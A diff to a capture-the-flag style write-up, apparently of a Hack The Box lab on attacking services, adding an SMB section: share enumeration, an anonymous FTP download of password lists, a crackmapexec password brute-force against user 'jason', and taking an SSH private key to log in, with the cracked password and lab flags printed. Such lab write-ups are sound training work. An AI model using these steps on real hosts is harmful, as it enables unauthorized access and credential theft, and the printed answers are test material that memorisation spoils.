@@ -2267,13 +2267,55 @@ Results: HTB{ATT4CK1NG_F7P_53RV1C3}
 
 ### SMB
 
-Question.
+**What is the name of the shared folder with READ permissions?**
 
 ```
-
+smbmap -H $ip
 ```
 
-Results: 
+Results: GGJ
+
+**What is the password for the username "jason"?**
+
+```
+sudo nmap -sC -sV $ip -Pn
+# Results 22,53, 139,445,2121
+
+ftp $ip 2121
+# Enter anonymous and anonymous
+
+# Download files
+mget *.list
+
+# Checksmb services
+smbmap -H //
+smbclient //$ip/GGJ -N
+smbclient //$ip/GGJ -N -r
+
+# However, downloading the id_rsa file is not possible due to permissions. 
+smbmap -H  $ip --download GGJ/id_rsa  //NOT WORKING 
+
+# We will download from resources pwd.list and launch a brute for attack 
+crackmapexec smb $ip -u jason -p pws.list  -d ATTCSVC-LINUX
+```
+
+Results: 34c8zuNBo91!@28Bszh
+
+**Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.**
+
+```
+# Log in as jason
+smbclient  //$ip/GGJ -U jason
+#Enter password
+get id_rsa
+quit
+
+chmod 600 id_rsa
+ssh -i id_rsa jason@$ip
+cat flag.txt
+```
+
+Results: HTB{SMB_4TT4CKS_2349872359}
 
 ### SQL Databases
 
